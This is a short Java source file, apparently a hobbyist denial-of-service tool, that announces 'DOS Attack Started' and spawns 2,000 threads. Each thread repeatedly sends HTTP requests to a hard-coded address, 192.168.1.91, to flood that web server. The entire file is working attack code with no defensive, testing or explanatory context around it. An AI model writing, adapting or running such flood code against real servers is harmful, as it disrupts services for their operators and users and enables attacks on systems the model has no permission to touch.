//package check.webreq;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

public class DOS {
	/**
	 * @param args
	 */
	public static void main(String[] args) {
		System.out.print("DOS Attack Started ");
		new Thread(new Runnable() {
			@Override
			public void run() {

				// Starts Thousand Threads
				for (int i = 0; i < 1000; i++) {
					Attacker attackers = new Attacker("http://192.168.1.91");
					attackers.start();
				}
				for (int i = 0; i < 1000; i++) {
					Attacker attackers = new Attacker("http://192.168.1.91");
					attackers.start();
				}
			}
		}).start();
	}

}

// This the thread that sends thousand requests to the server
class Attacker extends Thread {

	private String urlStr = "";

	public Attacker(String url) {
		urlStr = url;
	}

	public void run() {
		try {
			URL url = new URL(urlStr);
			for (int i = 0; i < 5; i++) {
				HttpURLConnection conn = (HttpURLConnection) url
						.openConnection();

				conn.setDoOutput(false);
				conn.setDoInput(true);
				conn.setUseCaches(false);
				conn.setDefaultUseCaches(false);
				// String inputText = "Dummy Request";
				// BufferedWriter out = new BufferedWriter(
				// new OutputStreamWriter(conn.getOutputStream()));
				// out.write(inputText);
				// out.flush();
				// out.close();

				 BufferedReader in = new BufferedReader(new InputStreamReader(
				 conn.getInputStream()));
				 in.read();
				 // String str = in.readLine();
				// while ((str = in.readLine()) != null)
				// System.out.println(str);

				System.out.print(i + " ");
			}
		} catch (MalformedURLException ex) {
			//ex.printStackTrace();
System.out.print("Excep ");
		} catch (IOException ex) {
//			ex.printStackTrace();
System.out.print("Excep ");
		}
	}
}
